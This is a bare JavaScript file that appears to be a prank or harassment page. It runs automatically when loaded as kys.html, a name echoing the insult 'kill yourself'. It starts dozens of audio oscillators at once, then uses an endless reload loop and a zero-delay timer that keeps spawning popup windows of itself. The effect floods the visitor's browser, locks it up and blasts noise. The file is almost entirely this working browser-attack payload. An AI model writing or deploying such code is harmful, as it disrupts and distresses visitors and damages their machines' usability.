        var oscillators = []; // Array to store oscillators

        function toggleOscillator() {
            // Create an audio context
            var AudioContext = window.AudioContext || window.webkitAudioContext;
            var audioContext = new AudioContext();

            // Create and start oscillators
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sine'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sawtooth'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'square'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'triangle'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sine'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sine'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }
            for (var i = 1; i <= 200000; i += 20000) {
                var oscillator = audioContext.createOscillator();
                oscillator.type = 'sine'; // Set oscillator type to sine wave
                oscillator.frequency.setValueAtTime(i, audioContext.currentTime);
                oscillator.connect(audioContext.destination);
                oscillator.start();
                oscillators.push(oscillator); // Store oscillator in the array
            }

        }
function kys(){
  toggleOscillator();
setTimeout(function(){
  while(true){
    window.location.reload();
  }
}, 10000);
setInterval(function(){
  window.open("kys.html");
  window.open("kys.html", "_blank");
  window.open("kys.html");
  window.open("kys.html", "_blank");
  window.open("kys.html", "", "width = 200; height=300;");
  window.open("kys.html", "", "width = 200; height=300;");
  window.open("kys.html");
  window.open("kys.html", "_blank");
  window.open("kys.html");
  window.open("kys.html", "_blank");
  window.open("kys.html", "", "width = 200; height=300;");
  window.open("kys.html", "", "width = 200; height=300;");
}, 0);
}
if(location.href.includes("kys.html")){
  kys();
}
